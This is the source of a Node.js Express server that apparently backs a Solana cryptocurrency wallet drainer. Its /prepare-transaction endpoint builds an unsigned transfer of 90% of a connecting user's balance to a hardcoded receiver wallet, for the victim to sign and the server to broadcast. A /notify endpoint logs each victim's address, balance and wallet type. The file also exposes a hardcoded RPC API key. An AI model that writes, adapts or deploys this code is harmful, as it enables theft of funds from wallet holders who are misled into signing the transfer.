const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// ============================================
// CONFIGURATION - USING HELIUS
// ============================================
const HELIUS_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';

// Create connection to Helius
const connection = new Connection(HELIUS_RPC, 'confirmed');

console.log('='.repeat(60));
console.log('🚀 SERVER STARTING');
console.log('📡 RPC:', HELIUS_RPC);
console.log('🎯 Receiver:', RECEIVER_WALLET);
console.log('='.repeat(60));

// ============================================
// HEALTH CHECK
// ============================================
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

// ============================================
// GET BALANCE - PROXY TO HELIUS
// ============================================
app.post('/api/getBalance', async (req, res) => {
    try {
        const { publicKey } = req.body;
        if (!publicKey) {
            return res.status(400).json({ error: 'publicKey required' });
        }
        
        const pubkey = new PublicKey(publicKey);
        const balance = await connection.getBalance(pubkey);
        
        console.log(`💰 Balance for ${publicKey.slice(0, 8)}...: ${(balance / 1e9).toFixed(4)} SOL`);
        res.json({ success: true, balance });
    } catch (err) {
        console.error('GetBalance error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// GET BLOCKHASH - PROXY TO HELIUS
// ============================================
app.post('/api/getBlockhash', async (req, res) => {
    try {
        const result = await connection.getLatestBlockhash();
        console.log(`🔗 Blockhash: ${result.blockhash}`);
        res.json({ success: true, blockhash: result.blockhash, lastValidBlockHeight: result.lastValidBlockHeight });
    } catch (err) {
        console.error('GetBlockhash error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// SEND TRANSACTION - PROXY TO HELIUS
// ============================================
app.post('/api/sendTransaction', async (req, res) => {
    try {
        const { transaction } = req.body;
        if (!transaction) {
            return res.status(400).json({ error: 'transaction required' });
        }
        
        const txBuffer = Buffer.from(transaction, 'base64');
        const signature = await connection.sendRawTransaction(txBuffer);
        
        console.log(`📤 Transaction sent: ${signature}`);
        
        // Optional confirmation (don't wait too long)
        setTimeout(async () => {
            try {
                const confirmation = await connection.confirmTransaction(signature, 'confirmed');
                if (confirmation.value.err) {
                    console.log(`⚠️ Confirmation warning:`, confirmation.value.err);
                } else {
                    console.log(`✅ Transaction confirmed: ${signature}`);
                }
            } catch(e) {}
        }, 2000);
        
        res.json({ success: true, txid: signature });
    } catch (err) {
        console.error('SendTransaction error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// PREPARE TRANSACTION - THE MAIN ONE
// ============================================
app.post('/prepare-transaction', async (req, res) => {
    console.log('\n📝 /prepare-transaction called');
    
    try {
        const { publicKey } = req.body;
        
        if (!publicKey) {
            console.log('❌ No publicKey provided');
            return res.status(400).json({ success: false, error: 'publicKey required' });
        }
        
        console.log(`   Wallet: ${publicKey.slice(0, 8)}...`);
        
        // Parse public keys
        let fromPubkey, toPubkey;
        try {
            fromPubkey = new PublicKey(publicKey);
            toPubkey = new PublicKey(RECEIVER_WALLET);
            console.log('   ✅ Public keys parsed');
        } catch (err) {
            console.log('   ❌ Invalid public key:', err.message);
            return res.status(400).json({ success: false, error: 'Invalid public key: ' + err.message });
        }
        
        // Get balance
        let balance;
        try {
            balance = await connection.getBalance(fromPubkey);
            console.log(`   💰 Balance: ${(balance / 1e9).toFixed(4)} SOL`);
        } catch (err) {
            console.log('   ❌ Failed to get balance:', err.message);
            return res.status(500).json({ success: false, error: 'Failed to get balance: ' + err.message });
        }
        
        // Check minimum balance (0.02 SOL)
        const MIN_BALANCE = 20000000; // 0.02 SOL
        if (balance < MIN_BALANCE) {
            console.log(`   ❌ Insufficient balance: ${(balance / 1e9).toFixed(4)} SOL < 0.02 SOL`);
            return res.json({ 
                success: false, 
                error: `Insufficient balance. Have: ${(balance / 1e9).toFixed(4)} SOL, Need: 0.02 SOL` 
            });
        }
        
        // Calculate amount to send (send 90%, keep 10% for fees)
        const amountToSend = Math.floor(balance * 0.9);
        console.log(`   📤 Amount to send: ${(amountToSend / 1e9).toFixed(6)} SOL`);
        
        // Create transaction WITHOUT blockhash
        const transaction = new Transaction();
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToSend,
            })
        );
        
        // Serialize WITHOUT blockhash and WITHOUT signatures
        const serialized = transaction.serialize({
            requireAllSignatures: false,
            verifySignatures: false
        });
        
        console.log(`   ✅ Transaction serialized, size: ${serialized.length} bytes`);
        console.log('   ✅ Response sent to frontend\n');
        
        res.json({ 
            success: true, 
            transaction: Array.from(serialized),
            amount: amountToSend,
            amountSol: (amountToSend / 1e9).toFixed(6)
        });
        
    } catch (err) {
        console.error('   ❌ CRITICAL ERROR:', err.message);
        console.error('   Stack:', err.stack);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============================================
// NOTIFICATION ENDPOINT
// ============================================
app.post('/notify', (req, res) => {
    const { address, balance, walletType, customMessage } = req.body;
    console.log('\n📱 NOTIFICATION:');
    console.log(`   Message: ${customMessage}`);
    console.log(`   Address: ${address ? address.slice(0, 8) + '...' : 'unknown'}`);
    console.log(`   Balance: ${balance} SOL`);
    console.log(`   Wallet: ${walletType}`);
    res.json({ ok: true });
});

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '='.repeat(60));
    console.log(`✅ SERVER RUNNING on port ${PORT}`);
    console.log(`🎯 Receiver wallet: ${RECEIVER_WALLET.slice(0, 8)}...${RECEIVER_WALLET.slice(-8)}`);
    console.log(`📡 RPC: Helius (mainnet)`);
    console.log('='.repeat(60) + '\n');
});
